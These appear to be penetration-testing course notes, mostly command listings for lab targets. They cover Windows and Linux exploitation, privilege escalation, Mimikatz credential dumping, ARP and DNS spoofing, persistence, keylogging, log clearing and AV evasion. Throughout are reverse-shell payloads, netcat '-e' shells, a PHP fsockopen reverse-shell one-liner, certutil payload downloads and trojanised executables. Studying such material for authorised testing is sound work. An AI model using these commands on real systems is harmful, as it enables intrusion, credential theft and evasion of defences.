# System/Host Based Attacks
## Windows
### Windows Vulnerabilities
**Exploiting WebDAV with Metasploit**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f asp > shell.asp
cadaver http://1.1.1.1/webdav
put /root/shell.asp
service postgresql start

use multi/handler
set payload windows/meterpreter/reverse_tcp

sysinfo
getuid

search iis upload
```

**Exploiting SMB with PsExec**
PsExec is lightweight telnet replacement. Similar to RDP, but command line.
```
search smb_login
set USER_FILE ...wordlist
set PASS_FILE ...wordlist

psexec.py Administrator@1.1.1.1 cmd.exe

MSF: search psexec
```

**EternalBlue**
Use metasploit on SMBv1.

**Exploiting RDP**
Default port is 3389, but often on other ports. Check ports with MSF.
```
search rdp_scanner

hydra -L ...common_users -P ...unix_passwords rdp://1.1.1.1 -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:1.1.1.1:3333
```

**BlueKeep**
RDP vulnerability. Use metasploit.

**Exploiting WinRM**
Typically on ports 5985 or 5986.
```
crackmapexec winrm 1.1.1.1 -u administrator -p ...unix_passwords
crackmapexec winrm 1.1.1.1 -u administrator -p tinkerbell -x "systeminfo"

evil-winrm.rb -u administrator -p 'tinkerbell' -i 1.1.1.1

search winrm_script
set FORCE_VBS true
```

### Windows Privilege Escalation
**Windows Kernel Exploits**
Windows-Exploit-Suggester and Windows-Kernel-Exploits.
```
Meterpreter: getsystem

MSF (automatic): search suggester

shell
systeminfo
Copy-paste information to txt file in kali
./windows-exploit-suggester.py --update --database 2021...xls --systeminfo win7.txt
Download binary for exploit

cd C:\\Temp\\
upload ~/Downloads/41015.exe
.\41015.exe 7
whoami
```

**Bypassing UAC with UACMe**
```
search rejetto
sysinfo
pgrep explorer
migrate 2448
sysinfo
getuid
getprivs
shell
net user
net localgroup administrators
net user admin password123

msfvenom -p ...reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f exe > backdoor.exe

use multi/handler
set payload ...reverse_tcp

cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe

getprivs
ps
migrate 688
getuid
```

**Access Token impersonation**
```
search rejetto
sysinfo
pgrep explorer
migrate 3512
getuid
getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
pgrep explorer
migrate 2512
getprivs
```

**Alternate Data Streams (ADS)**
Hide malware in resource stream (metadata). Evade basic signature based AVs or static analysis. 
```
type payload.exe > windowslog.txt:winpeas.exe
notepad windowslog.txt
start windowslog.txt:winpeas.exe
cd \
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate
```

### Windows Credential Dumping
**Windows Password Hashes**
- SAM database (Security Account Manager)
- Encrypted with a syskey
- Elevated privileges are required to interact with LSASS process
- LM (LanMan)
- NTLM (NTHash)

**Searching for passwords in Windows configuration files**
- Unattended Windows Setup utility
	- Panther\Unattend.xml
	- Panther\Autounattend.xml

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST.. LPORT.. -f exe > payload.exe
python -m SimpleHTTPServer 80
^Would be better to use exploit to get meterpreter

search -f Unattend.xml
cd C:\\Windows\\Panther
dir
download unattend.xml
base64 -d password.txt
psexec.py Administrator@1.1.1.1
```

**Dumping hashes with Mimikatz**
Extract hashes from the lsass.exe process memory where hashes are cached. Can use Kiwi extension in meterpreter. Requires privileges.
```
search badblue
pgrep lsass
migrate 788
load kiwi
creds_all
lsa_dump_sam

upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

### Exploiting Linux vulnerabilities
**Exploiting FTP**
```
hydra -L ...common_users -P ...unix_passwords 1.1.1.1 -t 4 ftp
ftp 1.1.1.1
dir
get secret.txt

searchsploit ProFTPd
```

**Exploiting SSH**
```
hydra ...
ssh sysadmin@1.1.1.1
```

**Exploiting SAMBA**
```
hydra ...
smbmap -H 1.1.1.1 -u admin -p password1
smbclient //1.1.1.1/share -U admin
get flag

enum4linux -a 1.1.1.1 -u admin -p password1
```

### Linux Privilege Escalation
**Linux Kernel Exploits**
Linux-Exploit-Suggester tool
```
sysinfo
getuid
> Download LES
cd /tmp
upload les.sh
shell
chmod +x les.sh
./les.sh
> Download exploit code
sudo apt-get install gcc
upload dirty.c
> Compile code
shell /bin/bash -i
chmod +x dirty
./dirty
ssh firefart@1.1.1.1
cat /etc/shadow
```

**Exploiting misconfigured cron jobs**
Find cron jobs scheduled by the root user
```
crontab -l
cd /
grep -rnw /usr -e "/home/student/message"
cat /tmp/message
ls -al /usr/local/share/copy.sh

printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l
```

**Exploiting SUID binaries**
Factors: SUIB binary owned by root user, and access to execute binary.
```
file welcome
strings
rm greetings
cp /bin/bash greetings
```

### Linux Credential Dumping
**Dumping Linux password hashes**
Determine hashing algorithm by the dollar symbol.
```
> Exploit with msf
sessions -u 1
cat /etc/shadow

search hashdump
```

# Network-Based Attacks
### Networking
**Firewall detection & IDS evasion**
```
> Detect the presence of a firewall (filtered)
nmap -Pn -sA -p445,3389 1.1.1.1
> Fragmentation 
nmap -Pn -sS -sV -p80,445,3389 -f --mtu 8 1.1.1.1
> Decoy as gateway IP with custom port (DNS server 53)
nmap -Pn -sS -sV -p80,445,3389 -f --data-length 200 -g 53 -D 1.1.1.1 1.1.1.88
```

### Network attacks
**SMB & NetBIOS enumeration**
- NetBIOS is an API. Name service, datagram service and session service. Typically ports 137, 138 and 139 over UDP and TCP.
- SMB is network file sharing protocol. Inter-process communication (IPC). SMB v1, v2.0/2.1, v3.0+
- Generally port 445 and port 139.
- Modern networks use DNS instead of NetBIOS, but often enabled together for backward compatibility.
```
nbtscan 1.1.1.0/20
nmblookup -A 1.1.1.1
nmap -sU -p 137 1.1.1.1
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 1.1.1.1
> None of the above works?

nmap -p445 --script smb-protocols 1.1.1.1
--script smb-security-mode
smbclient -L demo.ine.local
nmap -p445 --script smb-enum-users demo.ine.local
nano users.txt
hydra -L users.txt -P ...unix_passwords demo.ine.local smb
psexec.py administrator@demo.ine.local

search psexec

run autoroute -s 1.1.1.0/20
background
search socks
set VERSION 4a
set SRVPORT 9050
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
sessions 2

migrate -N explorer.exe
shell
net view 1.1.1.1
net use D: \\demo1.ine.local\Documents
net use K: \\demo1.ine.local\K$
dir D:
```

**SNMP enumeration**
- Simple Network Management Protocol
- Typically uses UDP
- Manager and Agent
- Management Information Base (MIB)
- v1, v2c and v3
- Ports 161 and 162
```
nmap -sU -sV -p161 demo.ine.local
nmap -sU -sV -p161 --script snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info
hydra -l administrator -P ...unix_passwords demo.ine.local smb
```

**SMB relay attack**
Interceptions, capturing authentication, relaying to a legitimate server, gain access.
```
search smb_relay
set SRVHOST 2.2.2.2
set LHOST 2.2.2.2
set SMBHOST 1.1.1.10

echo "2.2.2.2 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 1.1.1.5 1.1.1.1
arpspoof -i eth1 -t 1.1.1.1 1.1.1.5
```

# The Metasploit Framework
https://github.com/penetration-testing-execution-standard/ptes
```
systemctl enable postgresql
systemctl start postgresql
systemctl status postgresql
msfdb init

db_status
```
Some commands:
```
connect
workspace

```

### Client-side attacks
**Generating payloads with Msfvenom**
```
msfvenom --list payloads
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f exe > /home/kali/Desktop/payloadx86.exe
msfvenom --list formats
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -f elf > /home/kali/Desktop/payloadx86
chmod +x payloadx86

sudo python -m SimpleHTTPServer 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

**Encoding payloads with Msfvenom**
```
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodedx86.exe
```

**Injecting payloads into Windows portable executables**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=2.2.2.2 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > /home/kali/Desktop/winrar.exe
run post/windows/manage/migrate
```

### Automating
**Automating Metasploit with resource scripts**
```
ls -al /usr/share/metasploit-framework/scripts/resource

nano handler.rc
use multi/handler
set PAYLOAD ...
run

msfconsole -r handler.rc

resource handler.rc

makerc /home/kali/Desktop/portscan.rc
```

### Exploitation
**Exploiting a vulnerable HTTP file server**
```
search rejetto
> can set payload to architecture too
```

**Exploiting WinRM**
```
search winrm
winrm_auth_method, winrm_login, winrm_cmd, winrm_script
set FORCE_VBS true
```

**Exploiting a vulnerable Apache Tomcat web server**
```
search tomcat_jsp
set payload java/jsp_shell_bind_tcp
set SHELL cmd

msfvenom -p windwos/meterpreter/reverse_tcp LHOST.. LPORT... -f exe > meterpreter.exe
sudo python -m SimpleHTTPServer 80

certutil -urlcache -f http://2.2.2.2/meterpreter.exe meterpreter.exe

nano handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
LHOST.. LPORT...
run

.\meterpreter.exe
```

### Linux exploitation
**Exploiting a vulnerable FTP server**
```
search vsftpd
/bin/bash/ -i
search shell_to_meterpreter
set LHOST eth1
set SESSION 1
```

**Exploiting Samba**
```
search samba/is_known_pipename
check

search shell_to_meterpreter
```

**Exploiting a vulnerable SSH server**
```
search libssh_auth_bypass
set SPAWN_PTY true
cat /etc/*release
uname -r
search shell_to_meterpreter
```

**Exploiting a vulnerable SMTP server**
```
search haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST eth1
```

## Exploitation
### Post exploitation fundamentals
**Meterpreter fundamentals**
```
getuid
background
sessions -h

edit flag2
download flag5.zip
checksum md5 /bin/bash
getenv PATH
search -d /usr/bin -f *backdoor*
search -f *.jpg

cmd

ps
migrate 123

execute -f ifconfig
```

**Upgrading command shells to meterpreter shells**
```
search shell_to_meterpreter
set SESSION 1
set LHOST eth1

sessions -u 1
```

### Windows Post Exploitation
**Windows post exploitation modules**
```
search rejetto

sysinfo
getuid
help
getsystem
getuid
show_mount
ps
migrate 2212
cd C:\\
download flag.txt

search migrate
use post/windows/manage/migrate
search win_privs
search enum_logged_on
search checkvm
search enum_applications
search type:post platform:windows enum_av
search enum_computer
search enum_patches (systeminfo manually in session if this fails)
search enum_shares

search enable_rdp

loot
```

**Bypassing UAC**
User Account Control is a Windows security feature.

```
> after exploit
shell
net users
net localgroup administrators

search bypassuac
set LPORT 4433
set TARGET Windows\ x64
set PAYLOAD windows/x64/meterpreter/reverse_tcp

getsystem
getuid
hashdump
```

**Token impersonation with incognito**
Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS). Generated by winlogon.exe process every time a user authenticates successfully. Attached to userinit.exe process. Child processes started by user will inherit a copy of the access token and run under these privileges. Security levels: impersonate-level and delegate-level. Non-interactive vs. interactive login.
Must have SeImpersonatePrivilege. 
```
>after exploit
getprivs
load incognito
list_tokens -u
impersonate_token <...>
ps 
migrate <explorer.exe>
hashdump
```

**Dumping hashes with Mimikatz**
Mimikatz post-exploit tool to extract plaintext credentials from memory, password hashes from local SAM databases etc. Security Account Manager database.
```
>after exploit
pgrep lsass
load kiwi
help
creds_all
lsa_dump_sam
lsa_dump_secrets
```
Can also upload mimikatz and use executable directly in shell instead of meterpreter kiwi commands.

**Pass-the-hash with PsExec**
PsExec module to authenticate via SMB using NTLM hashes.
```
pgrep lsass
migrate ..
getuid
hashdump

search psexec
set payload ...
set SMBUser Administrator
set SMBPass 123:123
```

**Establishing persistence on Windows**
```
search platform:windows persistence_service
set payload ...
run and kill session

use multi/handler
set payload ...
set LHOST eth1
```

**Enabling RDP**
RDP uses TCP port 3389 by default. RDP is disabled by default. Requires authentication.
```
>after exploiting BadBlue
background

search enable_rdp
db_nmap -p 3389 demo.ine.local
sessions 1
net users
net user administrator hacker_123321

xfreerdp /u:administrator /p:hacker123321 /v:demo.ine.local
```

**Windows keylogging**
```
keyscan_start
keyscan_dump
keyscan_stop
```

**Clearing Windows Event Logs**
Event Viewer.
```
clearev
```

**Pivoting**
Use compromised host to attack other systems on the compromised host's private internal network. Add network route with meterpreter.
```
set RHOSTS victim1

ipconfig
run autoroute -s victim1/20
background
sessions -n victim-1 -i 1
search portscan tcp
set RHOSTS victim2
set PORTS 1-100

sessions 1 
portfwd add -l 1234 -p 80 -r victim2
background
db_nmap -sS -sV -p 1234 localhost
search badblue
set payload windows/meterpreter/bind_tcp
set LPORT 4433
set RHOSTS victim2
```

### Linux Post Exploitation
**Linux Post Exploitation Modules**
```
search samba -> is_known_pipename
sessions -u 1

search enum_configs
search env platform_linux -> post/multi/gather/env
search enum_network
loot
search enum_protections
notes
search enum_system
search checkcontainer
search checkvm
search enum_users_history
```

**Linux privilege escalation: exploiting a vulnerable program**
```
search ssh_login
username and password provided in lab

upgrade to meterpreter
/bin/bash -i
ps aux
chkrootkit -V

search chkrootkit
set CHKROOTKIT /bin/chkrootkit
set LHOST ?

whoami
```

**Dumping hashes with Hashdump**
```
search is_known_pipeline
sessions -u 1

sysinfo
getuid

search hashdump
>post/linux/gather/hashdump
loot
sessions 2
shell
/bin/bash -i
passwd root
useradd -m jan -s /bin/bash

>hashdump run
```
Number between dollar signs show hashing algorithm. Lower number are weaker. Hashed passwords in /etc/shadow

**Establishing persistence on Linux**
```
search ssh_login, password given

search chkrootkit
set CHKROOTKIT /bin/chkrootkit
set LHOST ...
sessions -u 3

useradd -m ftp -s /bin/bash
passwd ftp

groups root
usermod -aG root ftp
groups ftp
usermod -u 15 ftp

search platform:linux persistence
> cron_persistence
set LPORT ...
set LHOST ...
failed...
> service_persistence
set payload cmd/unix/reverse_python
set LHOST, LPORT ...
failed...
> sshkey_persistence
set CREATESSHFOLDER true
loot
exit -y

>copy over ssh_key
chmod 0400 ssh_key
ssh -i ssh_key root@ipaddress
```

### Armitage
run armitage in metasploit, easy pesay.

# Exploitation
PTES Penetration Testing Execution Standard

### Vulnerability Scanning Overview
**Banner Grabbing**
```
nmap -sV --script=banner 1.1.1.1
nc 1.1.1.1 22
searchsploit openssh 7.2
ssh root@1.1.1.1
```

**Vulnerability scanning with nmap scripts**
```
ls -al /usr/share/nmap/scripts/ | grep shellshock
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 1.1.1.1
```

**Vulnerability scanning with Metasploit**
```
searchsploit EternalBlue
searchsploit ms17-010

search eternalblue
```

### Exploits
**Searching for publicly available exploits**
Legitimate exploit databases: exploit-db and rapid7.

**Searching for exploits with SearchSploit**
```
ls -al /usr/share/exploitdb
searchsploit --update

searchsploit -m 49757 (copy to working directory)
searchsploit -c OpenSSH (case sensitive)
-t (title)
-e (exact)
searchsploit remote windows smb
searchsploit remote webapps wordpress
-w (get web links instead of local)
```

**Fixing exploits**
```
searchsploit HTTP File Server 2.3
searchsploit -m 39161
nano 39161.py
python 39161.py targetip targetport
> change ip address and port etc.
> open different tabs
python -m SimpleHTTPServer 80
nc -nvlp 1234
```

**Cross-compiling exploits**
```
sudo apt-get install mingw-w64
sudo apt-get install gcc
searchsploit VideoLAN VLC SMB
searchsploit -m 9303
i686-w64-mingw32-gcc 9303.c -o exploit
i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32

searchsploit Dirty Cow
searchsploit -m 40839
gcc -pthread 40839.c -o exploit -lcrypt
```

### Shells
**Netcat fundamentals**
Has client mode and server mode. 
```
nc -nv 1.1.1.1 80
nc -nvu 1.1.1.1 139

cd /usr/share/windows-binaries/
python -m SimpleHTTPServer 80

>on windows
certutil -urlcache -f http://host-ip/nc.exe nc.exe

nc -nvlp 1234
nc.exe -nv hostip 1234

nc.exe -nvlp 1234 > test.txt
nc -nv 1.1.1.1 1234 < test.txt
```

**Bind shells**
A type of remote shells when attacker connects directly to listener, allows for execution of commands on target system.
Problematic, needs to set up netcat listener and firewall may block incoming traffic.
```
nc.exe -nvlp 1234 -e cmd.exe
nc -nv 1.1.1.1 1234

nc -nvlp 1234 -c /bin/bash
nc.exe -nv targetip 1234
```

**Reverse shells**
Get target to connect directly to listener on attacker's system allowing for execution of commands on the target system. Does not need to be connected via netcat. Less chance of firewall on outgoing traffic. Can leak attacker's IP. 
```
nc -nvlp 1234
nc.exe -nv attackerip 1234 -e cmd.exe
```

**Reverse shell cheatsheet**
Github swisskyrepo/PayloadsAllTheThings.
Reverse Shell Generator revshells.com

### Frameworks
**The Metasploit Framework (MSF)**
Google default credentials for target system.
Find system information and versions.
```
searchsploit ProcessMaker
```

**PowerShell-Empire**
Empire mostly for exploitation and post-exploitation on Windows targets.
More for C&C for Windows targets. Some modules for Mac OS.
Starkiller is a GUI frontend for Empire. Create stagers etc.
```
sudo apt-get update && sudo apt-get install powershell-empire starkiller -y

sudo powershell-empire server
sudo powershell-empire client
listeners
agents
interact Windows7
```

### Windows exploitation
#### Windows Black Box Penetration Test
**Port scanning and enumeration - Windows**
```
cat /etc/hosts
mkdir Win2k8
ping 1.1.1.1
nmap -T4 -PA -sC -sV -p 1-10000 1.1.1.1 -oX nmap_10k
nmap -T4 -PA -sC -sV -p 1-65535 1.1.1.1 -oX nmap_all
nmap -T4 -PA -sC -sV -sU -p 1-65535 1.1.1.1 -oX nmap_udp
> check out different services in browser and netcat

nc -nv 1.1.1.1 21
service postgresql start
msfconsole
workspace -a Win2k8
db_import /root/Desktop/Win2k8/nmap_10k
search smb_version
use 0
set RHOSTS 1.1.1.1
run
hosts
```

**Targeting Microsoft IIS FTP**
Microsoft ftpd is intertwined with Microsoft IIS if both are found together.
```
nmap -sV -sC -p21,80 1.1.1.1
nmap -sV -p 21 --script=ftp-anon 1.1.1.1
ftp 1.1.1.1 21

hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P .../unix_passwords.txt 1.1.1.1 ftp
hydra -l vagrant -P .../unix_users.txt 1.1.1.1 ftp

msfvenom -p windows/shell/reverse_tcp LHOST=hostip LPORT=1234 -f asp > shell.aspx
>login with ftp
put shell.aspx

msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LPORT 1234
run
> go to the shell.aspx in browser
> this probably does not work
get index.html
```

**Targeting OpenSSH**
```
nmap -sV -sC -p 22 1.1.1.1
searchsploit OpenSSH 7.1
> no modules for this version
hydra -l vagrant -P ../unix_users.txt 1.1.1.1 ssh
ssh vagrant@targetip

msfconsole
search ssh login
use 0
```

**Targeting SMB**
```
hydra -l administrator -P .../unix_users.txt 1.1.1.1 smb
-l vagrant
smbclient -L 1.1.1.1 -U vagrant
smbmap -u vagrant -p vagrant -H 1.1.1.1
enum4linux -u vagrant -p vagrant 1.1.1.1

search smb_enumusers

locate psexec.py
chmod +x psexec.py
python3 psexec.py Administrator@1.1.1.1

search exploit/windows/smb/psexec
set payload windows/x64/meterpreter....

search eternalblue
> no need for credentials
```

**Targeting MySQL Database Server**
```
searchsploit MySQL 5.5

search mysql_login
set PASS_FILE .../unix_passwords.txt

mysql -u root -p -h 1.1.1.1
show databases;
>check WAMP server in browser

search eternalblue
cd /
cd wamp\\
cd www\\
cd wp-config\\
cd alias\\
download phpmyadmin.conf
> nano and delete rules, Allow from All

upload phpmyadmin.conf
shell
net stop wampapache
net start wampapache
> go to phpmyadmin in browser
> change admin password
> go to /wordpress/wp-admin
```

### Linux
#### Linux Black Box Penetration Test
**Port scanning & enumeration - Linux**
```
nmap -sV -p1-10000 1.1.1.1 -oN nmap_10k.txt
nc -nv 1.1.1.1 512
nc -nv 1.1.1.1 513
> manual banner grabbing on different ports...
cat /etc/*release
> check ports in browser
```

**Targeting vsFTPd**
```
ftp 1.1.1.1 21
> Name: anonymous
searchsploit vsftpd
> copy python exploit and nano to change code if needed
> exploit can be patched, blocking backdoor, and rendering exploit useless
nmap -sV -p 25 1.1.1.1
search smtp_enum
> user "service" is interesting
hydra -l service -P .../unix_users.txt 1.1.1.1 ftp
ftp 1.1.1.1 21
> access to files, but can't run all commands
> check 1.1.1.1/dav and upload reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php .
> nano and change ip and port to own ip and open port e.g., 1234

> in ftp
cd dav
put shell.php
nc -nvlp 1234
> in browser find the uploaded shell
```

**Targeting PHP**
```
> in browser, 1.1.1.1/phpinfo.php to check versions
searchsploit php cgi
> copy php cgi argument injection exploit and modify pwn code
<?php $sock=fsockopen("hostip",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>
python2 18836.py 1.1.1.1 80
```

**Targeting SAMBA**
```
nmap -sV -p 445 1.1.1.1
nc -nv 1.1.1.1 445
> banner grabbing, use msfconsole
search smb_version
searchsploit samba 3.0.20
search samba 3.0.20
> usermap_script
sessions -u 1

cat /etc/shadow
cat /etc/passwd
```

### Obfuscation
**AV Evasion with Shellter**
AV Software typically use signature, heuristic and behavior based detection.
AV evasion techniques:
- On-disk evasion techniques
	- obfuscation
	- encoding
	- packing
	- crypters
- In-Memory evasion techniques
	- manipulation of memory, inject payload into a process through Windows APIs, execute payload in memory in a separate thread.

Shellter project.
```
sudo apt-get install shellter -y
sudo dpkg --add-architecture i386
sudo apt-get install wine32
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
> Create a copy of a legitimate executable. 
Operation mode: A
PE Target: /home/kali/Desktop/AVBypass/vncviewer.exe
Enable Stealth mode: y
Use a listed payload: L 1

sudo python3 -m http.server 80

use multi/handler
set payload windows/meterpreter/reverse_tcp

> get vncviewer in Windows machine through on hosted httpserver, and see that it evades AV.
```

**Obfuscating PowerShell Code**
Invoke-Obfuscation is an open source PowerShell command and script obfuscator.
```
git clone ...danielbohannon/Invoke-Obfuscation
sudo apt-get install powershell -y
pwsh
cd Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
> Copy PowerShell code from PayloadsAllTheThings cheat sheet and change IP. Save as shell.ps1
SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
SET SCRIPTPATH ...shell.ps1
BACK

AST
ALL
1
> Save output as obfuscated.ps1 and transfer over to target system. E.g., host a http server, set up netcat listener and run with PowerShell on Windows target.
```

# Post-Exploitation
## Introduction
Depends on what kind of access you have to the system, and how stealthy you need to be. Must abide with rules of engagement agreed with the client.
Privilege escalation, maintaining persistent access, clearing tracks.

**Methodology**
- Local enumeration
    - system information, users and groups, network information, services, automation
- Transferring files
    - web server with Python, transfer to Windows and Linux
- Upgrading shells
    - meterpreter, TTY
- Privilege escalation
    - identifying privesc vulns on Windows and Linux
- Persistence 
    - Windows and Linux
- Dumping and cracking hashes
    - Windows and Linux
- Pivoting
    - internal network recon, pivoting
- Clearing tracks
    - Windows and Linux

## Windows Enumeration
**Enumerating System Information - Windows**
Hostname, OS Name, OS Build & Service Pack, OS Architecture, Installed updates/Hotfixes.
```
nmap -sV 1.1.1.1
searchsploit rejetto
search rejetto

getuid
sysinfo

shell
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

cd C:\\Windows\System32
cat eula.txt
> file might not exist
```

**Enumerating Users & Groups - Windows**
Current user & privileges, additional user information, other users on the system, groups, members of the built-in administrator group.
```
getuid
getprivs

search logged_on
set SESSION 1
run

shell
whoami
whoami /priv
query user
net users
net user administrator
net localgroup
net localgroup administrators
```

**Enumerating Network Information - Windows**
Current IP address & network adapter, internal networks, TCP/UDP services running and their respective ports, other hosts on the network, routing table, Windows Firewall state.
```
shell
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall firewall
netsh advfirewall show allprofiles
```

**Enumerating Processes & Services**
Running processes & services, scheduled tasks. Process is an instance of a running executable or program, service is a process which runs in the background and does not interact with the desktop.
```
ps
pgrep explorer.exe
migrate <pid>
getuid
sysinfo
pgrep hfs.exe

shell
net start
wmic service list brief
tasklist /SVC (important command)
schtasks /query /fo LIST (copy and paste results for later)
schtasks /query /fo LIST /v (verbose)
```

**Automating Windows Local Enumeration**














